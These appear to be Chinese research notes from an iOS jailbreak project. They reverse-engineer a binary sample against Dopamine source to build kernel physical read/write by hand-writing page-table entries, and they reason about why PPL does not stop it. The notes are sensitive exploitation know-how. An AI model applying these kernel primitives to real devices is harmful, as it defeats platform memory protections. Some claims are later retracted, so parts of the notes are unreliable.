## 已定案：physrw 走样本那条路，PPL 不是障碍（2026-09-22）

### 0. 最要紧的一条：**PPL 不拦「kwrite 写页表页」**（Dopamine 源码级证据）

来源：`opa334/Dopamine` 2.x，本地克隆在 `D:\工作区\_Aether_rev\refs\Dopamine\`。

`BaseBin/libjailbreak/src/primitives.c:140-149`：

```c
int physwritebuf(uint64_t physaddr, const void* input, size_t size)
{
    if (gPrimitives.physwritebuf) {
        return gPrimitives.physwritebuf(physaddr, input, size);
    }
    else if (gPrimitives.kwritebuf && gPrimitives.phystokv) {
        return _physwritebuf_virt(physaddr, input, size);   // ← kwrite + phystokv
    }
    return -1;
}
```

而 `physrw_pte_handoff()`（`physrw_pte.c:104-149`）在**还没有 physrw 能力**的阶段就调用了
`physwrite64`（`:132`、`:140`）—— 所以它必然走上面第二条：
**物理地址经 `phystokv` 转成内核 VA，再用 `kwrite` 写进去。**

**结论：在 iOS 15/16 上，用内核写原语直接写页表页是可行的，PPL 不拦。**

**这纠正了两处此前的错误判断**：
1. ~~"iOS 16 的 PPL 会拦掉非 PPL 代码对页表页的写"~~ —— 错，Dopamine 就是反例；
2. ~~"样本用用户态 `str` 写 PTE 所以 PPL 管不着"~~ —— 该前提从未被独立验证（子代理明确指出），
   且**真因与它无关**：PPL 本来就不拦这条路径。

### 0.1 Dopamine 有两条 physrw 路，首选那条要 kcall

`launchdhook/src/boomerang.c:86`：

```c
bool physrwPTE = firstRetrieval && !is_kcall_available();
```

- **首选（有 kcall 时）**：`kernel.c:196` 用 `kcall` 调内核自己的
  `pmap_enter_options_addr(pmap, va, pa, VM_PROT_READ|VM_PROT_WRITE, ...)`
  ——**让内核去建映射，自己根本不碰页表**，所以与 PPL 无关。
- **备选（无 kcall 时）**：`physrw_pte` —— 手工造一块页表窗口，逐条写 PTE，
  走的是上面那条 `kwrite + phystokv`。
- 备选路还挑设备：`device_supports_physrw_pte()` 在 A8（typhoon）上返回 false
  （"causes SUPER WEIRD UNEXPLAINABLE SYSTEM RESTARTS"），Aether 的目标机不在排除之列。

**Aether 没有 kcall**（那需要 gadget 链，样本里有 `kernelGadget.*` 而 Aether 没有）。
**但 Aether 不需要它** —— 备选路只要 `kwrite` + `phystokv`，而这两样都在手上
（`kwrite` = `kwrite_sem_open`；`phystokv` 用兜底式 `pa - gPhysBase + gVirtBase`）。

### 0.2 两组 PTE 常量是同一套（交叉印证）

```c
// Dopamine  BaseBin/libjailbreak/src/pte.h:13
#define KRW_URW_PERM   (0x60000000000040)     // 内核读写 + 用户读写
```

样本写进 PTE 的 `0x0060000000000e43` 拆开正是 **同一个 `0x60000000000040`**
加低位 `VALID|TYPE|SH|AF|nG`。**样本与 Dopamine 用的是同一套 PTE 编码。**

> 样本三处构造点（`orr <pte>, <pa>, #0x6000000000000e43`）：
> `0x101049060` / `0x10104ce24` / `0x1010524e8`。
> **注意 `0x0060000000000e43` 的 bits[47:12] 全 0（PA=0），它是模板不是成品**
> —— 必须先 `pa | 它`。裸写等于把 VA 指到物理页 0，立刻彩屏。

### 0.3 仍然未决的一条（子代理标为最关键）

样本那三处 `str` 的**存储地址 provenance**：是 PUAF 窗口的用户 VA，还是 kwrite 的目标 KVA？
子代理未做通（样本 250 MB，`0x3d0/0x3d8` 同型偏移全文数百处，静态无法唯一定位）。

**但这条已经不再阻塞**：既然 PPL 不拦 `kwrite` 写页表（§0），两条 provenance 都可用 ——
若是 KVA，就直接走 `kwrite + phystokv`；若是用户态窗口 VA，就说明 PUAF 窗口里有页表页。
**先按前者推进，成本最低。**

### 0.1 样本不用 kcall（确证）——所以「补 kcall」这件大活可以直接砍掉

**判定**：样本的 8 个 `kernelGadget.*`（`br_x22` / `kcall_return` / `pacda` /
`exception_return_after_check(_no_restore)` / `ldp_x0_x1_x8` / `str_x8_x9` / `str_x0_x19_ldr_x20`）、
`ml_sign_thread_state`、`pmap_enter_options_addr`（两个同名键）、`pmap_remove_options`
—— **共 12 个键，在 38 个 `bl xpf_item_resolve` 调用点里一个都没出现**。

唯一沾边的是 `kernelSymbol.pmap_enter_pv`（`0x101cd2d00`，调用点 `0x101040d40`），
但它的用法是**能力探测**而非调用：

```
0x101040d40  bl  xpf_item_resolve
0x101040d44  cmp x0, #0        ← 只做空判断
0x101040d48  cset w8, eq
0x101040d58  br  x8            ← CFF 状态分发，不是 kcall
```

**三条独立封口**：
1. 页级穷举（853 个 `adrp`，window 12）→ 每个键只有 2 个 materialization 点
   （注册处 `adrp+add x0` + 字符串解密 `strb`），**没有第三类引用点**；
2. 全文件 345 MB 的 8 字节扫描（13 个键地址 + resolve/register 函数地址）→ **零命中**，
   排除「把键指针藏数据段再加载」与「间接调用 resolve」两条后路；
3. physrw 三处 PTE 写入点（`0x101049060` / `0x10104ce24` / `0x1010524e8`）所属函数的
   571 个 `adrp+add` 中，命中这些键的次数 = **0**。

**结论**：样本 = Dopamine 的 **`physrw_pte` 那条路**（写 PTE），不是首选路（kcall 调
`pmap_enter_options_addr`）。那些 gadget 键与 `ppl_*` 一样，是随 XPF 整库进来、登记完闲置的。

**对 Aether**：不需要实现 kcall（那要 gadget 链 + PAC 处理，是大工程）。
需要的仍然只有 **`kwrite` + `phystokv`**，两样都在手上。

> **方法论修正（必须传下去）**：`xpf_item_resolve` 内部会 `blr x8` 惰性调用节点的注册
> resolver（`0x10102f294 ldp x8,x0,[x20,#0x10]` → `0x10102f298 blr x8`，节点布局
> `next@0 / key@8 / fn@0x10 / arg@0x18 / inited@0x20 / result@0x28`，链表头 `*0x101d227b8`）。
> **所以"resolver 在 bl 图里 0 个调用者"不能单独当作"闲置"的证据** —— 对活键同样成立。
> 正确判据是「**这个键有没有进入 `xpf_item_resolve`**」。
> （`ppl_*` 那次结论侥幸没错，是因为它同时满足"从未被 resolve"。）

### 0.4 页表页来源：**(I) 确证 —— 样本就是 Dopamine 的 `physrw_pte` 那条路**

**一句话**：样本先在内核侧**建出**一张页表页，再用**一次物理写**把该页表页的**第 0 项写成指向它自己**
（自映射）。建好自映射之后，那个固定地址才变成普通 `str` 可写的页表页。

**决定性现场**（函数 `[0x101049a7c, 0x10104cf00)` 内，VA `0x10104cdc0` 起）：

```
0x10104cdc8  bl   #0x101093820        ; ret1 = L1_BLOCK_SIZE
0x10104cdd0  bl   #0x1010939d0        ; ret2 = L1_BLOCK_COUNT
0x10104cdd4  sub  x8, x0, #1
0x10104cdd8  mul  x1, x8, x26         ; x1 = (COUNT-1)*SIZE = 0x7000000000
0x10104cddc  mov  x0, x25             ; x0 = pmap
0x10104cde8  bl   #0x1010488e0        ; ★ 在 0x7000000000 上取/建页表 → 返回页表页地址
0x10104cdec  mov  x25, x0             ; x25 = magicPT
0x10104ce24  mov  x21, #0xe43
0x10104ce28  movk x21, #0x60,lsl#48   ; x21 = 0x0060000000000e43（L3 叶项模板）
0x10104ce2c  orr  x1, x25, x21
0x10104ce30  mov  x0, x25
0x10104ce34  bl   #0x10104f800        ; ★ physwrite64(magicPT, magicPT|PTE) = 自映射
```

- `0x10104f800` = `physwrite64(pa,val)`：`str x1,[sp,#8]; add x1,sp,#8; mov w2,#8; bl 0x10104e8c0`；
  后端 `0x10104e8c0` 走 `ldr x8,[0x101d228a0]; blr x8`。
- `0x10104ce08-ce34` 之间**没有任何** `mach_vm_allocate` / `vm_allocate` / `vm_map` / `mmap`
  —— **唯一的"做实"动作就是这次物理写**。

**与 Dopamine 逐字同构**（这就是我此前要的那个判定）：

```c
// Dopamine BaseBin/libjailbreak/src/physrw_pte.c
:13   #define MAGIC_PT_ADDRESS (L1_BLOCK_SIZE * (L1_BLOCK_COUNT - 1))
:125  int exp_r = pmap_expand_range(pmap, MAGIC_PT_ADDRESS, L2_BLOCK_SIZE);
:132  physwrite64(magicPT, magicPT | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL
                                | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY);
:48   for (int i = 2; i < L2_BLOCK_COUNT; i++)    ← acquire_window 从 i=2 开始
```

样本侧一一对应：地址同公式（`(COUNT-1)×SIZE`）、在建出的页表上写自映射、
写入常量同值（`| 0x60…` 是样本额外加的 `NX|PXN`）、窗口槽从 **`w22` 初值 = 2** 开始。
**参数名不同（Dopamine 用 511，样本用 7），是因为 Dopamine 取"最后一个 L1 块"、
样本取第 7 块 —— 公式同一个，取值不同。**

**(II) 已排除**：`0x7000000000 = L1_BLOCK_COUNT × L1_BLOCK_SIZE` 是**用户地址空间上界**
（iOS 16K 的 `MACH_VM_MAX_ADDRESS`），`vm_map`/`vm_allocate` 在该地址必返
`KERN_INVALID_ADDRESS`；PUAF 窗口（内核随机选址）不可能落在它上面；
且样本自己把这个地址当"要建的地址"传给建表函数。

**地址推导（独立复核过）**：`0x101093820` 出口读 `[0x101cfff78]`(`_vm_kernel_page_size`)
→ 16K 返 `0x1000000000`（=L1 块）、4K 返 `0x40000000`；`0x1010939d0` 同源
→ 16K 返 `8`、4K 返 `0x100`（=L1 块数）。于是 16K：`(8−1)×2^36 = 0x7000000000` ✓、
4K：`0xFF×2^30 = 0x3FC0000000` ✓ —— 与 `0x100ff3548/3564/3580` 三个立即数逐位一致。

**这条同时回答了两个悬了很久的问题**：

1. **样本走的是 Dopamine 备选路（`physrw_pte`），不是自研新路线** —— 是同一算法的移植/变体；
2. **它不需要 kcall** —— 建页表这一步走的是**物理读+物理写**，不是 kcall 去调
   `pmap_expand_range`（与 §0.1「kcall 键从未被 resolve」完全自洽）。

**仍未确证（严格与证否分开）**：
1. `0x1010488e0` 内部让内核**分配新表**的具体机制（kcall vs 纯读写手工串表）——
   只确证它做 `base+idx*8 → physread64(0x10104f878) → &0xfffffffff000` 的页表遍历并返回表地址；
2. 物理写后端那个全局指针槽 `[0x101d228a0]` 的**写入者**未定位
   → "任意物理读写的最终来源"未确证；
3. `magicPT+8`（`sw_asid` 项，Dopamine `:140`）的写入未定位。

### 0.5 建表那一步怎么做：**备选路本来就不需要 kcall**（源码级，2026-09-22 修正）

**此前一句「备选路要 kcall」是错的，此处修正。**

Dopamine `BaseBin/libjailbreak/src/util.c:252` 的 `pmap_expand_range` **有两个分支**，
而且**无 kcall 那一支是完整的**：

```c
int pmap_expand_range(uint64_t pmap, uint64_t vaStart, uint64_t size)
{
    uint64_t ttep = kread_ptr(pmap + koffsetof(pmap, ttep));
    if (is_kcall_available()) {
        /* 让内核用 pmap_enter_options 建表；再把映射 pmap_remove 掉，
           但先把 pmap->type 设成 3(nested) 以保住那张空表，之后再改回 0。
           —— 这条反而更绕，因为"建好又要撤"。 */
    } else {
        /* 用户态手工串页表，全程只有页表遍历 + 物理写： */
        for (每个 L2 块) {
            do {
                uint64_t pte = 0;
                vtophys_lvl(ttep, va, &leafLevel, &pte);        // ① 页表遍历
                if (leafLevel != PMAP_TT_L3_LEVEL) {            // ② 这一级还没有下级表
                    leafLevel++;
                    uint64_t newTable = pmap_alloc_page_table(pmap, pt_va);
                    physwrite64(pte, newTable | ARM_TTE_VALID | ARM_TTE_TYPE_TABLE);  // ③ 物理写
                }
            } while (leafLevel < PMAP_TT_L3_LEVEL);
        }
    }
}
```

`pmap_alloc_page_table`（`util.c:224-250`）同样是纯物理写：

```c
uint64_t tt_p  = alloc_page_table_unassigned();   // 要一张"未关联"的页表页
uint64_t ptdp  = pvh_ptd(pai_to_pvh(pa_index(tt_p)));
physwrite64(ptdp_pa + koffsetof(pt_desc, pmap), pmap);      // 关联到目标 pmap
physwrite64(ptdp_pa + koffsetof(pt_desc, va) + …, va + po); // 关联到目标 VA
return tt_p;                                                // 返回新表的物理地址
```

**所以两条路的条件正好相反于我先前的表述**：

| | 要什么 | 机制 |
|---|---|---|
| **首选路**（`pmap_enter_options_addr`） | **要 kcall** | 让**内核**去建整块映射，必须能调内核函数 |
| **备选路**（`pmap_expand_range` 无 kcall 支） | **只要「页表遍历 + 内核写原语 + phystokv」** | 用户态**手工串页表**，每步自己读表、写表项 |

**因此样本「无 kcall 却走备选路」完全自洽** —— 正是 `launchdhook/src/boomerang.c:86`
那行 `bool physrwPTE = firstRetrieval && !is_kcall_available();` 的含义：
**没 kcall 就退备选路，而备选路不需要 kcall。**

**对 Aether 的直接结论**：照抄 `util.c:303-335` 那一支，需要的三样全在手上 ——

```
① 页表遍历      pmap->ttep 起逐级下行（第一段只读验证要确认的就是这个）
② 内核写原语    km_write（kwrite_sem_open，kopen 已在设备上跑通）
③ phystokv      兜底式 pa - gPhysBase + gVirtBase（三个基准值已读到且自洽）
```

### 1. 一手来源：kfd 作者对 PPL 的原话（原判断的出处）

**结论（一手来源）**：kfd 作者 Félix Poulin-Bélanger 的
[Exploiting PUAFs](https://raw.githubusercontent.com/felix-pb/kfd/main/writeups/exploiting-puafs.md)
原文：

> **PPL surprisingly does very little to prevent this technique.** Of course, it prevents the
> PUAF pages from being reused as page tables and other PPL-protected structures.

**这句话要拆成两半读，读错就全盘皆错**：

- **PPL 挡的是**：把 PUAF 页**重新分配成**页表页（kfd 作者本想在 Linux 上照搬 Jann Horn 那条路，
  在 iOS 上被 PPL 挡死，他因此只能改走 object-spray 拿 kread/kwrite，再靠 perf 兜底）。
- **PPL 不管的是**：那个页**本来就是页表页**、只是同时落进了 PUAF 窗口 —— 此时修改它
  用的是**用户态普通 `str`**，走的是用户映射那条路，根本不进 PPL 管辖的内核映射路径。

**样本走的正是后者**。指令级证据：`0x101048e78` 里
`mov x8,#0xe43` / `movk x8,#0x60,lsl#48` / `orr` / `str ...`，写进去的常量
`0x0060000000000e43` 位域解出来是：

```
bit54 NX=1, bit53 PXN=1       ← 不可执行
低12位 0xe43: VALID=1 TYPE=1 AP=1 SH=1 AF=1 nG=1
                ↑ AP=1 表示 **EL0（用户态）可读可写**
```

**一条普通用户态 `str`、一条明确授权用户态访问的 PTE —— 全程不经过内核映射，PPL 无从拦起。**

**推论**：Aether 不需要实现 PPL 绕过（与样本逆向的结论一致：样本那 12 个 `ppl_*` 键
零调用者、`blr` 数 0）。真正要解决的是**窗口里怎么出现页表页**这一环。

## physrw 五步与 Aether 现状

修的是一条样本不走的岔路。

## 工作纪律（YG 定的，2026-09-22）

**遇到「网上有答案」的问题，先搜，不要自己猜。**

反例就是近在眼前的教训：XPF 的 `kernelSymbol.ptov_table` 为什么读出来不对，
我连着四五轮从设备截图抄原始字节、试字段顺序、推位变换，全是在猜。真去拉
[`opa334/XPF`](https://github.com/opa334/XPF) 的 `src/common.c` 一读就清楚了：

- `xpf_find_ptov_table` **自己不做独立定位**，它先 resolve `kernelSymbol.phystokv`，
  再在 phystokv 的反汇编里找**第 2 个 LDR**；
- 而 `xpf_find_phystokv` 又是靠**数 `arm_vm_init` 里的 bl 数量**，上游还专门写了
  `n = (kernelBase == 0xfffffe0007004000) ? 2 : 1` —— 因为 ARM_LARGE_MEMORY 内核上
  这个布局变过一次。

**两层脆弱推导叠在一起**，这才是「表结构像、内容域不对」的正解方向。

配套的三条具体做法：
1. 涉及第三方库/开源项目的行为（XPF、ChOma、libkfd、kfd 派生项目、iOS 内核结构），
   **第一步就去读它的公开源码**，别从设备现象倒推。
2. 搜索要换词：项目名、函数名、描述性短语都试（`golb` / `maphys` 这两个 physrw
   参考实现，就是换成 "Accessing physical memory on iOS" 这种说法才搜出来的）。
3. **只有公开资料确实没有的部分**（商业样本的私有实现、本机特有数值）才回落离线取证。
   而离线取证时也要先问：这个量有没有权威来源？能拿就别从屏幕抄字节——已经抄错过三次。
